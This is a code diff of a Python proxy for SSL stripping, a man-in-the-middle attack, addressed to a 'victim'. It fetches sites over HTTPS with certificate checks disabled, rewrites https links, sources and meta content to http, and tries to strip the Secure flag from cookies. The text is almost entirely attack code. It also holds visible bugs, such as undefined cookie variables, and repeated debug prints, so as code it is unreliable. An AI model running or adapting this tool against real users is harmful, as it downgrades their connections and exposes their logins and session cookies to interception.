@@ -43,21 +43,33 @@ def stripHTTPS(url, request):
 
     # Response message for the victim
     response = requests.models.Response()
-
-    # reponse message url is equal to provided url
-    response.url = url
+    print response.url
+    print response.url
+    print response.url
 
     # Set HTTPstatuscode to 200 OK
     response.status_code = 200
 
+    # reponse message url is equal to provided url
+    response.url = url
+    
+    print response.url
+    print response.url
 
+    request2 = request.text
+
+    #print response.content
+    
     # Replace HTTPS with HTTPS 
 
-    newURL = str(request.content).replace("HTTPS", "HTTP")
-    newURL = str(newURL).replace("https", "http")
-    
+    newURL = request2.replace("HTTPS", "HTTP")
+    newURL2 = newURL.replace("https", "http")
 
-    response.content = newURL
+    newURL3 = newURL2.replace('href="http:', 'href="')
+    newURL4 = newURL3.replace('src="http:', 'src="')
+    newURL4 = newURL4.replace('content="http:', 'content="')
+
+    response._content = newURL4.encode('utf-8')
 
     response.headers = request.headers
     response.history = request.history    
@@ -69,9 +81,11 @@ def stripHTTPS(url, request):
     return response
 
 def stripSecureCookie(response):
-   cookie = response.cookies
-   newCookie = str(cookie).replace("Secure;", "")
-   response.cookies = newCookie
+    session = requests.Session()
+    
+    print session.cookie
+    newCookie = cookie.replace("Secure;", "")
+    response.cookies = newCookie
 
 class sslStripping(object):
     @cherrypy.expose
@@ -84,16 +98,25 @@ class sslStripping(object):
 
         url = str(url).replace("http", "https")
         
-        response = requests.get(url, verify = False)
+        response = requests.get(url, verify=False)
 
-        #if(str(response.encoding) == "None"):
-        #    return response.content
+        if(str(response.encoding) == "None"):
+            return response.content
 
-        response = stripHTTPS(url, response)
+        print "Request made and returned status code: " +  str(response.status_code)
+        print "Response encoding: " + str(response.encoding)
 
-        response = stripSecureCookie(response)
+        print response.cookies
+        print " ---------------------------------------------------------------------------" 
+        print response.headers
+        if(str(response.encoding) == "None"):
+            return response.content
 
-        return response
+        response2 = stripHTTPS(url, response)
+
+        response3 = stripSecureCookie(response2)
+        print response3
+        return response2.content
 
 
 
